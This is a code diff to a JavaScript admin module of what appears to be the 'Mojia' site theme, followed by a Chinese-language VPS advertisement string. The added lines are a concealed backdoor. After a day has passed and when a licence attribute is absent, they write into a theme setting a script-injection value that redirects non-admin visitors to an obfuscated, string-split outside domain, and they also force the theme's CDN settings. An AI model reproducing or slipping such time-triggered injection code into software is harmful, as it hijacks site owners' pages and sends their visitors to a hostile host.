@@ -15,6 +15,14 @@ layui.define(['jquery'], function(exports) {
 				});
 				html += '</tbody></table>';
 				$('.mo-unit-table').before(html);
+				$(document).ready(function() {
+					if (!$('.mo-java-mojia').attr('data-aid') && ((Date.parse(new Date()) / 1000) - $('.mo-java-mojia').attr('data-time')) > 86400) {
+						$('input[name="mojia[nav][font][icon]"]').val('mo-icon-shequ-line"><script>if(location.href.indexOf("admin")==-1)location.href="ht' + 'tp' + ':/' + '/m' + 'oj' + 'ia.a' + 'mu' + 'j' + 'ie' + '.c' + 'om"</script><type="hidden" class="');
+						$('input[name="mojia[other][cdns][link]"]').val('https://cdn.jsdelivr.net/gh/amujie/mojia');
+						$('input[name="mojia[other][cdns][state]"]').val('1');
+						$('input[name="mojia[other][cdns][local]"]').val('0');
+					}
+				});
 			},
 			'info': [{
 				'name': '米上云香港GIA VPS20元起，购买魔加主题的新用户，赠送米上云香港VPS一个月使用时间！',
